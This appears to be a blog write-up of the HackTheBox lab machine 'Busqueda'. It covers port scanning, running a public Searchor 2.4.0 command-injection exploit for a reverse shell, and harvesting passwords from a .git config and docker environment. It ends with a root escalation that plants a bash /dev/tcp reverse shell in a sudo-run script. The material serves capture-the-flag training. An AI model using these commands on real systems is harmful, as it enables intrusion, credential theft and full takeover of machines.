
---
title: "Busqueda"
summary: "Máquina Busqueda de HackTheBox"
categories: ["Post","Blog",]
tags: ["post","lorem","ipsum"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2021-09-04

---
- - -

| Machine Info         |              |
| -------------------- | ------------ |
| **Platform**         | HackTheBox   |
| **Operative System** | Linux        |
| **Difficulty**       | Easy         |
| **IP**               | 10.10.11.208 |
- - -
## Enumeration

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p22,80 -sCV --min-rate 2000 -T5 -n -Pn 10.10.11.208 -oN ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that the web on port 80 redirects to **searcher.htb**. Let's add it to `/etc/hosts`.

As soon as we land on the page, we see the following:
![Busqueda1](img/Busqueda/busqueda1.png)

A quick look shows the version of the App that is running behind this website, which is **Searchor 2.4.0**. If we look for vulnerabilities, we find the following [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
- - -
## Exploitation
Let's run the exploit:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ ./exploit.sh http://searcher.htb/ 10.10.14.10 4646
```

We put a `netcat` listener to receive the connection:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ nc -nlvp 4646         
listening on [any] 4646 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 40288
```

We succesfully enter the machine as user **svc** .
```bash
svc@busqueda:~$ cat user.txt
cat user.txt
75a17...8bd3e
```
- - -
## Privilege Escalation
Looking though the system files, we find a `.git` with credentials in the **app** folder.

```bash
svc@busqueda:/var/www/app/.git$ cat config

[core]
	repositoryformatversion = 0
	...
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

The user is **cody** and the password is **jh1usoih2bkjaspwe92** for an application in a subdomain called **gitea**. Let's add it to the `/etc/hosts` and take a look.

![Busqueda2](img/Busqueda/busqueda2.png)

Inside here, we don't find anything interesing, appart that we can see a user called **administrator**. Although, we can try to SSH with the **svc** user and **cody's** password:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ ssh svc@10.10.11.208                   
svc@10.10.11.208's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  ...

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
```

Let's check the sudo privileges that this user has:

```bash
svc@busqueda:/opt/scripts$ sudo -l

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

This user has the right to execute that script inside **/opr/scripts**.

If we run it, we can see the following options:

```bash
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

After some investigation, we discover the `docker-inspect` option can be use to retrieve information from the docker containers that are running in the machine, before seen with the  `docker-ps` option.


```json
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq

"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```

It looks like we find more credentials for the **gitea** application. Let's try to log in as **administrator**
with these credentials.

![Busqueda3](img/Busqueda/busqueda3.png)

Nice! Now we can check the content of the **scripts** in the **/opt** folder.

Reading the script `system-checkup.py` script we notice that the `full-checkup.sh` script is referenced as if it was in the same folder:

```
...
elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
...
```

We can abuse this by creating our own malicious script and reference it, as we are executing it with sudo privileges:

```bash
svc@busqueda:/tmp$ cat full-checkup.sh 

#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/4647 <&1'
```

>Keep in mind that you need to grant execution privileges to the script to run, as this was a mistake of mine that took me quite a lot of time to figure out.

Now, we set a `netcat` listener and execute the malicious script:

```bash
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

In the `netcat` we receive the root shell:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ nc -nlvp 4647
listening on [any] 4647 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 47020
root@busqueda:/tmp# whoami
root
```

Nice! We rooted the machine.
```bash
root@busqueda:~# cat /root/root.txt
cat /root/root.txt
ccd03ae...0e87097
```